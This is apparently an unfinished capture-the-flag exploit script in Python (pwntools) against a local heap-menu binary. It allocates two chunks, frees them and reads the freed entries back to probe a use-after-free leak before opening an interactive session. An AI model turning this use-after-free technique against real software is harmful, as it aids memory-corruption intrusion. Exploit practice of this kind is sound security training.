from pwn import *

context.log_level = 'debug'
context.terminal = ('open-wsl.exe', '-e')
# io = gdb.debug("./pwn", env={"LD_PRELOAD": "./ld-2.27.so:./libc.so.6"})
io = gdb.debug("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")


def add(index, size, data):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("index:\n", str(index))
    io.sendlineafter("size:\n", str(size))
    io.sendafter("data:\n", data)


def edit(index, data):
    io.sendlineafter(">> ", "2")
    io.sendlineafter("index:\n", str(index))
    io.sendafter("data:\n", data)


def remove(index):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("index:\n", str(index))


def view(index):
    io.sendlineafter(">> ", "4")
    io.sendlineafter("index:\n", str(index))
    io.recvuntil("Here is it :")
    ret = io.recvuntil("\n")
    return ret


add(0, 90, "a"*90)
add(1, 90, "a"*90)
remove(1)
remove(0)
view(0)
view(1)
io.interactive()
